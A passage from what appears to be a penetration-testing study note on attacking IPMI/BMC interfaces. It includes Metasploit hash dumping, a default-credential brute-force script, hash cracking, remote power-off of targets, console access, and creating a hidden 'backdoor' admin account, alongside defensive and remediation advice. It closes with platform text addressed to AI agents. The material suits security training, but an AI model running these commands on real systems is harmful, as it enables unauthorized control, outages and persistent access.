+# Extract password hashes via RAKP vulnerability
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+
+# Crack hashes offline
+hashcat -m 7300 hashes.txt wordlist.txt
+```
+
+### 2. Default Credential Access
+
+```bash wrap
+# Test default credentials
+for user in admin root ADMIN; do
+    for pass in admin password root calvin; do
+        ipmitool -I lanplus -H target -U $user -P $pass chassis status
+    done
+done
+```
+
+### 3. Power Management Attacks
+
+```bash wrap
+# Power off system
+ipmitool -I lanplus -H target -U admin -P pass power off
+
+# Power cycle system
+ipmitool -I lanplus -H target -U admin -P pass power cycle
+
+# Reset system
+ipmitool -I lanplus -H target -U admin -P pass power reset
+```
+
+## Enumeration Checklist
+
+### Initial Discovery
+
+* [ ] Port scan for 623/UDP
+* [ ] IPMI version detection
+* [ ] Service availability confirmation
+* [ ] Network accessibility assessment
+
+### Vulnerability Assessment
+
+* [ ] Cipher zero vulnerability testing
+* [ ] Authentication bypass attempts
+* [ ] Default credential testing
+* [ ] Version-specific vulnerability checks
+
+### Information Gathering
+
+* [ ] User account enumeration
+* [ ] System information extraction
+* [ ] Hardware configuration analysis
+* [ ] Network configuration review
+
+### Security Testing
+
+* [ ] Password hash extraction
+* [ ] Privilege escalation testing
+* [ ] Power management access
+* [ ] Configuration modification attempts
+
+## Tools and Techniques
+
+### Essential IPMI Tools
+
+```bash wrap
+# Command-line tools
+ipmitool             # Primary IPMI management tool
+ipmiutil             # Alternative IPMI utility
+freeipmi-tools       # Free IPMI implementation
+
+# Scanning tools
+nmap                 # Network discovery and scripts
+metasploit           # Vulnerability exploitation
+
+# Password cracking
+hashcat              # GPU-accelerated password cracking
+john                 # John the Ripper
+```
+
+### Tool Installation
+
+```bash wrap
+# Install ipmitool
+sudo apt install ipmitool
+
+# Install ipmiutil
+sudo apt install ipmiutil
+
+# Install freeipmi-tools
+sudo apt install freeipmi-tools
+```
+
+### Custom Scripts
+
+```bash wrap
+# IPMI scanner
+#!/bin/bash
+target_network=$1
+
+nmap -sU -p623 --script ipmi-version $target_network | grep -E "Nmap scan report|ipmi-version" | grep -A1 "open"
+
+# IPMI credential tester
+#!/bin/bash
+target=$1
+userlist="admin root ADMIN user"
+passlist="admin password root calvin blank"
+
+for user in $userlist; do
+    for pass in $passlist; do
+        result=$(ipmitool -I lanplus -H $target -U $user -P $pass chassis status 2>/dev/null)
+        if [ $? -eq 0 ]; then
+            echo "Success: $user:$pass"
+        fi
+    done
+done
+```
+
+## Defensive Measures
+
+### Secure IPMI Configuration
+
+```bash wrap
+# Change default passwords
+ipmitool -I lanplus -H target -U admin -P admin user set password 2 strong_password
+
+# Configure network access restrictions
+# In BMC configuration:
+# - Restrict IPMI to management network
+# - Disable unnecessary services
+# - Enable logging
+
+# Disable anonymous access
+ipmitool -I lanplus -H target -U admin -P pass user disable 1
+```
+
+### Best Practices
+
+1. **Change Default Passwords**: Use strong, unique passwords
+2. **Network Segmentation**: Isolate IPMI on management network
+3. **Regular Updates**: Keep BMC firmware updated
+4. **Access Control**: Limit IPMI access to authorized users
+5. **Monitoring**: Log and monitor IPMI access attempts
+
+### Detection and Monitoring
+
+```bash wrap
+# Monitor IPMI access attempts
+# Check BMC logs for authentication failures
+# Monitor network traffic to port 623
+# Set up alerts for unusual IPMI activity
+```
+
+## Common Vulnerabilities
+
+### IPMI 2.0 RAKP Authentication Bypass
+
+* **CVE**: CVE-2013-4786
+* **Impact**: Password hash extraction
+* **Mitigation**: Disable cipher zero, use strong passwords
+
+### Default Credentials
+
+* **Issue**: Factory default passwords
+* **Impact**: Unauthorized system access
+* **Mitigation**: Change all default passwords
+
+### Network Exposure
+
+* **Issue**: IPMI accessible from untrusted networks
+* **Impact**: Remote unauthorized access
+* **Mitigation**: Network segmentation, firewall rules
+
+## Hash Cracking Techniques
+
+### Hashcat IPMI Mode
+
+```bash wrap
+# IPMI hash format (mode 7300)
+hashcat -m 7300 -a 0 hash.txt wordlist.txt
+
+# Example hash:
+# admin:8140000089eb9c5f41b4e0632b85f1e1e6e9a7b0:f2b4f8c7b4c4b4c4:2:admin:admin
+
+# Optimized cracking
+hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+### John the Ripper
+
+```bash wrap
+# Convert hash format if needed
+john --format=ipmi hash.txt
+
+# Crack with wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+## Post-Exploitation
+
+### System Control
+
+```bash wrap
+# Power management
+ipmitool -I lanplus -H target -U admin -P pass power on
+ipmitool -I lanplus -H target -U admin -P pass power off
+ipmitool -I lanplus -H target -U admin -P pass power reset
+
+# Console access
+ipmitool -I lanplus -H target -U admin -P pass sol activate
+
+# Boot device selection
+ipmitool -I lanplus -H target -U admin -P pass chassis bootdev pxe
+```
+
+### Persistence
+
+```bash wrap
+# Create new user account
+ipmitool -I lanplus -H target -U admin -P pass user set name 3 backdoor
+ipmitool -I lanplus -H target -U admin -P pass user set password 3 backdoor_pass
+ipmitool -I lanplus -H target -U admin -P pass user priv 3 4
+ipmitool -I lanplus -H target -U admin -P pass user enable 3
+```
+
+## Remediation
+
+### Immediate Actions
+
+1. **Change all default passwords**
+2. **Disable unnecessary user accounts**
+3. **Update BMC firmware**
+4. **Configure network restrictions**
+5. **Enable logging and monitoring**
+
+### Long-term Security
+
+1. **Regular password rotation**
+2. **Network segmentation**
+3. **Vulnerability scanning**
+4. **Access control reviews**
+5. **Incident response procedures**
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/ipmi-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
